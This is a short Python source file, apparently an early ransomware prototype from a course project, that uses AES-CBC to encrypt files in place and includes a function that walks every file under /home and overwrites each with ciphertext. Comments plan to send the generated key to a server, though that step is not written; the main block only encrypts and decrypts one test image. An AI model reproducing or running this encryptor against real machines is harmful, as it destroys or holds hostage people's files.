#!/usr/bin/env python
# coding=UTF-8
import base64


import os

from Crypto.Cipher import AES
from Crypto.Util import Counter

from Crypto import Random

import file_finder

#Encryption and decryption functions adapted from: https://stackoverflow.com/questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes


def pad(s):
	return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def generateEncryptionKey(bits):
	return os.urandom(bits)


def encrypt(message, key):
	message = pad(message)
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(message)

def decrypt(ciphertext, key):
	iv = ciphertext[:AES.block_size]
	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(ciphertext[AES.block_size:])
	return plaintext.rstrip(b"\0")

def performCrypto(file_name, key, cryptoFunc):
	with open(file_name, 'r+b') as fo:
		initial = fo.read()
		resultant = cryptoFunc(initial, key)
		fo.seek(0)
		fo.truncate()
		fo.write(resultant)

def beginFileModification(key, cryptoFunc):

	#send key back
	#change directory accordingly
	startDirectory = ['/home']
	for currentDirectory in startDirectory:
		for file in file_finder.findFiles(currentDirectory):
			performCrypto(file, key, cryptoFunc)
			#print(file)

		
if __name__ == '__main__':
	#encrypt file and then decrtypt
	key = generateEncryptionKey(16)
	#send generated key here to server


	filePath = "C:/Users/rayan/590Ransomware/map.png"
	performCrypto(filePath, key, encrypt)
	performCrypto(filePath, key, decrypt)



	#print(plaintext.decode('cp437'))